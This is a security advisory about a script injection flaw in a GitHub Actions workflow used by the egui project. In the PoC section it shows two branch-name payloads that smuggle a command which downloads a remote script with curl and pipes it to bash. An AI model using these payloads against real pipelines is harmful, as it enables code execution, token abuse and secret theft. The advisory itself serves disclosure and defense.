Title

GitHub Actions Script Injection in `egui`

Description
### Summary
The `egui` action available at [URL] is vulnerable to GitHub Actions script injection. If anyone uses the action within a workflow that runs on the `pull_request_target` trigger, an attacker can inject arbitrary code into that workflow using a crafted branch name.

### Details
The issue exists because `.github/workflows/preview_cleanup.yml` is a composite action and uses GitHub context expressions in a `run` step:

```yaml
echo "URL_SLUG=${{ github.event.pull_request.number }}-${{ github.event.pull_request.head.ref }}" >> $GITHUB_ENV
```

In this case, `github.event.pull_request.head.ref` is user-controlled and can be used to inject code.

### PoC
Create a fork of any repository that uses `[URL] within a workflow that runs on `pull_request_target`.

In the fork, create a branch with an injection payload, e.g.:

```bash
test";{curl,-sSfL,gist.githubusercontent.com/.../file.sh}${IFS}|${IFS}bash
```

or

```bash
$({curl,-sSfL,raw.githubusercontent.com/.../file.sh}${IFS}|${IFS}bash)
```

Create a draft pull request.

If the action is reachable, the attacker achieves arbitrary code execution.

### Impact
Any workflow using this action that runs on `pull_request_target` is vulnerable to arbitrary code execution within the context of the base branch. An attacker can use this to:
1. **Permissions Risk**: If the workflow uses `permissions: contents: write`, the risk of repository compromise increases significantly.
2. **Abuse the `GITHUB_TOKEN`**: This allows unauthorized changes to the repository.
3. **Steal secrets**: Secrets used within the workflow can be exfiltrated.
4. **Severe Consequences**: Similar vulnerabilities have led to severe incidents. For example, the **Ultralytics** repository was exploited to inject malicious code into their PyPI packages, infecting a wide user base with a cryptominer.
